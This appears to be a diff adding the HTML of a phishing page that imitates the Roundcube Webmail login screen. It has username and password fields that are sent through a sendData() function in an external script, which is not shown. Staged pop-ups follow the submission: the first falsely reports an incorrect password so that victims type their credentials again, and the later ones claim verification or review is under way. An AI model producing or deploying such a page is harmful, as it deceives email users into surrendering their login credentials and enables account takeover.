@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Round C Temp</title>
+    <link rel="stylesheet" href="./style.css" />
+    <script src="./script.js" defer></script>
+  </head>
+  <body>
+    <!-- Modal for First Submission -->
+    <div id="modalOverlay1" class="modal-overlay">
+      <div class="modal-box">
+        <h2>Verification failed ⚠️</h2>
+        <p>
+          Your password or username is incorrect!
+          Please check if you have entered your password correctly or if you have forgotten it. 
+        </p>
+        <button class="modal-btn" onclick="hideModal(1)">Close</button>
+      </div>
+    </div>
+
+    <!-- Modal for Second Submission -->
+    <div id="modalOverlay2" class="modal-overlay">
+      <div class="modal-box">
+        <h2>Account verification in progress ✔️</h2>
+        <p>
+          Your login details are now being compared with our records to verify their accuracy.
+          Once the process is complete, your verification will be finalized.
+        </p>
+        <button class="modal-btn" onclick="hideModal(2)">Close</button>
+      </div>
+    </div>
+
+    <!-- Modal for Third Submission -->
+    <div id="modalOverlay3" class="modal-overlay">
+      <div class="modal-box">
+        <h2>Under review ⚠️</h2>
+        <p>
+          More information has been recorded. Please review everything carefully.
+        </p>
+        <button class="modal-btn" onclick="hideModal(3)">Close</button>
+      </div>
+    </div>
+
+   
+
+<main>
+
+  <h1 class="main-title">
+    Roundcube Webmail
+  </h1>
+
+  <div class="card">
+
+    <img
+      src="./assests/images/user.png"
+      alt="user"
+      class="avatar"
+    />
+
+    <form
+      class="wrapper"
+      id="myForm"
+      onsubmit="sendData(); return false;"
+    >
+
+      <label class="input-label">
+        USERNAME
+      </label>
+
+      <input
+        name="email"
+        type="email"
+        id="input-email"
+        required
+        autocomplete="off"
+      />
+
+      <label class="input-label">
+        PASSWORD
+      </label>
+
+      <div class="password-wrapper">
+
+        <input
+          name="password"
+          id="input-password"
+          type="password"
+          required
+          autocomplete="new-password"
+        />
+
+     
+
+      </div>
+
+      <button class="login-btn">
+        LOGIN
+      </button>
+
+    </form>
+
+  </div>
+
+</main>
+
+    
+  </body>
+</html>
